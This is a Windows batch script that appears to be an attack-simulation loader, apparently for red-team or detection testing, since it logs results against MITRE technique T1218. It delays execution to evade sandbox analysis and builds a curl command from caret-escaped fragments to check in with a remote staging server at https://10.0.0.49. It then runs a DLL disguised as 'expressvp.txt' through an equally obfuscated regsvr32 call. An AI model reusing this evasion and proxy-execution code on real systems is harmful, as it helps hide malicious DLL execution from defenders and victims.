@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET yktnwwf=%APPDATA%\7839\bbf6fa72
SET fpakbq=Macula-Stage0-7839
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7839-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=expressvp.txt
SET fpldhe=7839

REM Log file path
SET lhruwn=%APPDATA%\!yydue!\macula-simulations.log

REM Create log directory if it doesn't exist
IF NOT EXIST "%APPDATA%\!yydue!\" (
    mkdir "%APPDATA%\!yydue!\" >nul 2>nul
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: create_log_dir=%APPDATA%\!yydue!>> "!lhruwn!" 2>nul
)

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=initial_30s>> "!lhruwn!" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=initial_30s>> "!lhruwn!" 2>nul

REM 1. Check server availability with obfuscated curl
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_start=!rdzgrnne!>> "!lhruwn!" 2>nul

REM Obfuscate curl command with caret escapes
SET a1=c^
SET a2=u^
SET a3=r^
SET a4=l
SET b1=-^
SET b2=k
SET c1=-^
SET c2=s
SET d1=-^
SET d2=o
SET e1=n^
SET e2=u^
SET e3=l

!a1!!a2!!a3!!a4% !b1!!b2% !c1!!c2% !d1!!d2% !e1!!e2!!e3% "!rdzgrnne!"
SET rc1=!errorlevel!

IF !rc1! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_success=!rdzgrnne!>> "!lhruwn!" 2>nul
    SET hbres=1
    SET hberr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: heartbeat_failed=error_!rc1!>> "!lhruwn!" 2>nul
    SET hbres=0
    SET hberr=connection_failed
)

REM Random delay between operations
SET /A rdelay=!RANDOM! %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=random_!rdelay!s>> "!lhruwn!" 2>nul
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=random_!rdelay!s>> "!lhruwn!" 2>nul

REM 2. Change to output directory
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>> "!lhruwn!" 2>nul
cd /d "!yktnwwf!" >nul 2>nul
SET rc2=!errorlevel!

IF !rc2! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_success=!yktnwwf!>> "!lhruwn!" 2>nul
    SET cdres=1
    SET cderr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: chdir_failed=error_!rc2!>> "!lhruwn!" 2>nul
    SET cdres=0
    SET cderr=path_not_found
)

REM Short delay before execution
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=pre_exec_5s>> "!lhruwn!" 2>nul
ping -n 5 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=pre_exec_5s>> "!lhruwn!" 2>nul

REM 3. Execute DLL with obfuscated Regsvr32
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_start=!edjwtl!>> "!lhruwn!" 2>nul

REM Obfuscate regsvr32 with heavy caret escapes and full path
SET f1=%^
SET f2=S^
SET f3=y^
SET f4=s^
SET f5=t^
SET f6=e^
SET f7=m^
SET f8=R^
SET f9=o^
SET f10=o^
SET f11=t^
SET f12=%^
SET f13=\^
SET f14=S^
SET f15=y^
SET f16=s^
SET f17=t^
SET f18=e^
SET f19=m^
SET f20=3^
SET f21=2^
SET f22=\^
SET g1=R^
SET g2=e^
SET g3=g^
SET g4=s^
SET g5=v^
SET g6=r^
SET g7=3^
SET g8=2^
SET h1=.^
SET h2=e^
SET h3=x^
SET h4=e
SET i1=/^
SET i2=s

!f1!!f2!!f3!!f4!!f5!!f6!!f7!!f8!!f9!!f10!!f11!!f12!!f13!!f14!!f15!!f16!!f17!!f18!!f19!!f20!!f21!!f22!!g1!!g2!!g3!!g4!!g5!!g6!!g7!!g8!!h1!!h2!!h3!!h4% !i1!!i2% "!edjwtl!"
SET rc3=!errorlevel!

IF !rc3! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_success=!edjwtl!>> "!lhruwn!" 2>nul
    SET dlres=1
    SET dlerr=
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: dll_load_failed=error_!rc3!>> "!lhruwn!" 2>nul
    SET dlres=0
    SET dlerr=regsvr32_failed
)

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_start=final_15s>> "!lhruwn!" 2>nul
CHOICE /C Y /N /D Y /T 15 >nul
echo [!DATE! !TIME!][DEBUG][!omxgazu!]: delay_end=final_15s>> "!lhruwn!" 2>nul

REM TTP Logging for T1218 - Signed Binary Proxy Execution
SET ttp_result=!dlres!
SET ttp_error=!dlerr!

REM Normalize timestamp to YYYY-MM-DD HH:MM:SS.SSS
SET log_date=!DATE:/=-!
SET log_time=!TIME: =0!
IF "!log_time:~1,1!"==":" SET log_time=0!log_time!
SET log_timestamp=!log_date:~-4!-!log_date:~3,2!-!log_date:~0,2! !log_time!.000

REM Build TTP log line
SET ttp_line=[!log_timestamp!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!

REM Append to log file with error suppression
echo !ttp_line!>> "!lhruwn!" 2>nul || (
    REM Log failure silently
    echo [!DATE! !TIME!][DEBUG][!omxgazu!]: ttp_log_failed>> nul 2>nul
)

echo [!DATE! !TIME!][DEBUG][!omxgazu!]: script_complete>> "!lhruwn!" 2>nul
ENDLOCAL